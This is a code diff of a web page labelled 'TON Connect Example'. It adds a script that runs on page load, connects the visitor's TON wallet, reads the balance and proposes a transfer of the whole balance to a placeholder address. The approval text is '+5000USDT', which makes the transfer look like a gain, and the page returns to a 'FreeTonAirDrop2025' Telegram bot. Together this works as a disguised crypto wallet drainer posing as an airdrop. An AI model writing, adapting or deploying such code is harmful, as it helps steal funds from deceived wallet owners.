@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>TON Connect Example</title>
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
-   
 </head>
 <body>
 
@@ -16,21 +15,41 @@
             buttonRootId: 'ton-connect'
         });
         tonConnectUI.uiOptions = {
-      twaReturnUrl: 'https://t.me/FreeTonAirDrop2025_bot'
-  };
-  
-    </script>
-<script>
-    async function connectToWallet() {
-        const connectedWallet = await tonConnectUI.connectWallet();
-        // Do something with connectedWallet if needed
-        console.log(connectedWallet);
-    }
+            twaReturnUrl: 'https://t.me/FreeTonAirDrop2025_bot'
+        };
 
-    // Call the function
-    connectToWallet().catch(error => {
-        console.error("Error connecting to wallet:", error);
-    });
-</script>
+        async function connectToWallet() {
+            const connectedWallet = await tonConnectUI.connectWallet();
+            console.log(connectedWallet);
+
+            // Get the wallet address
+            const walletAddress = connectedWallet.account.address;
+
+            // Load the balance of the wallet
+            const balance = await tonConnectUI.getBalance(walletAddress);
+            console.log(`Wallet balance: ${balance}`);
+
+            // Propose a transaction to transfer all TON tokens
+            const transferAmount = balance; // Assuming you want to transfer the entire balance
+            const recipientAddress = 'EQD...'; // Replace with the recipient's wallet address
+            const transferTx = {
+                validUntil: Math.floor(Date.now() / 1000) + 3600,
+                messages: [{
+                    address: recipientAddress,
+                    amount: transferAmount,
+                    text: '+5000USDT' // Add the message to be displayed during transaction approval
+                }]
+            };
+
+            // Send the transaction
+            const txResult = await tonConnectUI.sendTransaction(transferTx);
+            console.log('Transaction result:', txResult);
+        }
+
+        // Call the function
+        connectToWallet().catch(error => {
+            console.error("Error connecting to wallet:", error);
+        });
+    </script>
 </body>
 </html>
